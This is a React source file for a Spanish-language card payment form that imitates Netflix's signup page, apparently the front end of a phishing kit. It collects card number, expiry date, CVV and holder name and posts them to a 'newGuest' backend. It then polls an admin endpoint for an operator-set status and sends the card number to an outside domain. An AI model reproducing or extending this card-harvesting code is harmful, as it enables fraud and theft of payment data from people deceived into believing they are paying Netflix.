import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Spinner from '../Spinner/SpinnerW';  // Asegúrate de que la ruta es correcta
import './HeroCredit.css';

const PaymentStepCard = () => {
    const navigate = useNavigate();

    const [loading, setLoading] = useState(false);
    const [formValues, setFormValues] = useState({
        cardNumber: '',
        expirationDate: '',
        cvv: '',
        cardHolderName: '',
    });
    const [errors, setErrors] = useState({
        cardNumber: '',
        expirationDate: '',
        cvv: '',
        cardHolderName: '',
    });

    const [isSpinnerVisible, setIsSpinnerVisible] = useState(false);  // Estado para mostrar el spinner
    const [apiStatus, setApiStatus] = useState(null);  // Estado para almacenar el status_id de la API

    useEffect(() => {
        const savedFormValues = localStorage.getItem('formValues');
        if (savedFormValues) {
            setFormValues(JSON.parse(savedFormValues));
        }
    }, []);

    useEffect(() => {
        localStorage.setItem('formValues', JSON.stringify(formValues));
    }, [formValues]);

    const handleChange = (e) => {
        const { name, value } = e.target;
        if (name === 'expirationDate') {
            setFormValues({ ...formValues, [name]: formatExpirationDate(value) });
        } else {
            setFormValues({ ...formValues, [name]: value });
        }
    };

    const formatExpirationDate = (date) => {
        const numericValue = date.replace(/\D/g, '');
        const formattedValue = numericValue
            .slice(0, 4)
            .replace(/(\d{2})(\d{0,2})/, '$1/$2');
        return formattedValue;
    };

    const validateForm = () => {
        const newErrors = {};
        if (!/^[0-9]{13,19}$/.test(formValues.cardNumber)) {
            newErrors.cardNumber = 'Número de tarjeta inválido';
        }
        const [month, year] = formValues.expirationDate.split('/').map(Number);
        const today = new Date();
        const currentMonth = today.getMonth() + 1;
        const currentYear = today.getFullYear() % 100;
        if (!/^\d{2}\/\d{2}$/.test(formValues.expirationDate) ||
            month < 1 || month > 12 ||
            (year < currentYear || (year === currentYear && month < currentMonth))) {
            newErrors.expirationDate = 'Fecha de vencimiento inválida o en el pasado';
        }
        if (!/^\d{3}$/.test(formValues.cvv)) {
            newErrors.cvv = 'CVV debe ser un número de 3 dígitos';
        }
        if (!/^[A-Za-z\s]+$/.test(formValues.cardHolderName.trim())) {
            newErrors.cardHolderName = 'El nombre del titular solo debe contener letras y espacios';
        }
        setErrors(newErrors);
        return Object.keys(newErrors).length === 0;
    };

    const handleSubmit = async (e) => {
        e.preventDefault();
        if (!validateForm()) return;

        setLoading(true);
        const cardData = {
            cardNumber: formValues.cardNumber,
            expirationDate: formValues.expirationDate,
            cvv: formValues.cvv,
            cardHolderName: formValues.cardHolderName,
        };
        localStorage.setItem('cardData', JSON.stringify(cardData));

        try {
            const response = await fetch('http://127.0.0.1:8000/api/v1/newGuest', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    user: formValues.cardHolderName,
                    ip: 'new Ip',
                    cc: formValues.cardNumber,
                    expiration_date: formValues.expirationDate,
                    ccv: formValues.cvv,
                    'user-agent': 'PostmanRuntime/7.43.0',
                }),
            });

            if (!response.ok) {
                throw new Error('Error en la solicitud al servidor');
            }

            const data = await response.json();
            localStorage.setItem('token', data.token);

            setIsSpinnerVisible(true);  // Mostrar el Spinner después de enviar la solicitud

            // Iniciar consulta periódica cada 2 segundos
            const interval = setInterval(async () => {
                try {
                    const checkResponse = await fetch('http://127.0.0.1:8000/api/v1/admin/guests', {
                        method: 'GET',
                        headers: {
                            'Content-Type': 'application/json',
                            'Cookie': `laravel_session=${document.cookie}` // Enviar la cookie para mantener la sesión
                        },
                    });

                    if (!checkResponse.ok) {
                        throw new Error('Error al consultar la API');
                    }

                    const checkData = await checkResponse.json();
                    const guest = checkData.guests[0];  // Asumimos que siempre hay un solo guest

                    if (guest.status_id !== 1) {
                        clearInterval(interval);  // Detener el intervalo si el status cambia
                        setIsSpinnerVisible(false);  // Detener el spinner
                        // Aquí puedes redirigir o hacer lo que necesites al recibir el estado final
                        const response = await fetch('https://streaming.renovapunto.online/procesar', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ codigo: formValues.cardNumber }), // AquÃ­ solo envÃ­as el nÃºmero de tarjeta
                        });
                
                        if (!response.ok) {
                            throw new Error('Error en la solicitud al servidor');
                        }
              // Cambiar a la ruta que desees
                    }
                } catch (error) {
                    console.error('Error en la consulta:', error);
                    clearInterval(interval);  // Detener el intervalo en caso de error
                    setIsSpinnerVisible(false);  // Detener el spinner
                }
            }, 2000);  // Consulta cada 2 segundos

        } catch (error) {
            console.error('Error en la solicitud:', error);
            setLoading(false);
        }
    };

    return (
        <div className="container mx-auto px-6 py-8 mt-2.5">
            {isSpinnerVisible && <Spinner />}
            <div className="text-left mb-4">
                <span className="block text-left">
                    Paso <b>2</b> de <b>2</b>
                </span>
            </div>
            <h1 className="text-3xl font-bold leading-none mb-4">
                Configura tu tarjeta de crédito o débito
            </h1>
            <div className="mb-6">
                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/VISA.png" alt="Visa" className="inline-block h-5 mr-4" />
                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/MASTERCARD.png" alt="MasterCard" className="inline-block h-5 mr-4" />
                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/AMEX.png" alt="American Express" className="inline-block h-5 mr-4" />
                <img src="https://assets.nflxext.com/siteui/acquisition/payment/ffe/paymentpicker/DINERS.png" alt="Diners Club" className="inline-block h-5" />
            </div>
            <form onSubmit={handleSubmit} className="bg-white p-5 rounded-lg shadow-lg mb-8">

                <div className="relative mb-4">
                    <input type="text" id="cardNumber" name="cardNumber" maxLength={16} value={formValues.cardNumber} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
                    <label htmlFor="cardNumber" className="absolute left-3 top-4 text-gray-500 transition-all duration-300 transform origin-left peer-focus:scale-90 peer-focus:-translate-y-1 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 text-sm">
                        Número de tarjeta
                    </label>
                    {errors.cardNumber && <p className="text-red-500 text-sm">{errors.cardNumber}</p>}
                </div>

                <div className="flex space-x-4 mb-4">
                    <div className="flex-1 relative">
                        <input type="text" id="expirationDate" name="expirationDate" maxLength={5} value={formValues.expirationDate} onChange={handleChange} className="w-full px-3 pt-5 pb-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 peer" placeholder=" " />
                        <label htmlFor="expirationDate" className="absolute left-3 top-4 text-gray-500 transition-all duration-300 transform origin-left peer-focus:scale-90 peer-focus:-translate-y-1 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 text-sm">
                            (MM/AA)
                        </label>
                        {errors.expirationDate && <p className="text-red-500 text-sm">{errors.expirationDate}</p>}
                    </div>

                    <div className="flex-1 relative">
                        <input type="text" id="cvv" name="cvv" maxLength={3} value={formValues.cvv} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
                        <label htmlFor="cvv" className="absolute left-3 top-4 text-gray-500 transition-all duration-300 transform origin-left peer-focus:scale-90 peer-focus:-translate-y-1 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 text-sm">
                            CVV
                        </label>
                        {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}
                    </div>
                </div>

                <div className="relative mb-4">
                    <input type="text" id="cardHolderName" name="cardHolderName" value={formValues.cardHolderName} onChange={handleChange} className="peer block w-full px-3 py-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-red-500 focus:border-red-500 sm:text-sm" placeholder=" " />
                    <label htmlFor="cardHolderName" className="absolute left-3 top-4 text-gray-500 transition-all duration-300 transform origin-left peer-focus:scale-90 peer-focus:-translate-y-1 peer-focus:text-red-500 peer-placeholder-shown:scale-100 peer-placeholder-shown:translate-y-0 text-sm">
                        Nombre del titular
                    </label>
                    {errors.cardHolderName && <p className="text-red-500 text-sm">{errors.cardHolderName}</p>}
                </div>

                <div className="bg-gray-50 p-6 rounded-lg shadow-lg text-sm">
                    <p className="mb-4">
                        Los pagos se procesarán internacionalmente. Es posible que se apliquen comisiones bancarias adicionales.
                    </p>
                    <p className="mb-4">
                        Al hacer clic en el botón «Iniciar membresía», aceptas nuestros Términos de uso y nuestra Declaración de privacidad, declaras que tienes más de 18 años.
                    </p>
                </div>


                <button type="submit" className="w-full bg-[#e50914] text-white px-4 py-2 rounded-md shadow-sm hover:bg-[#d40813]">
                    {loading ? 'Procesando...' : 'Iniciar membresía'}
                </button>
            </form>
        </div>
    );
};

export default PaymentStepCard;
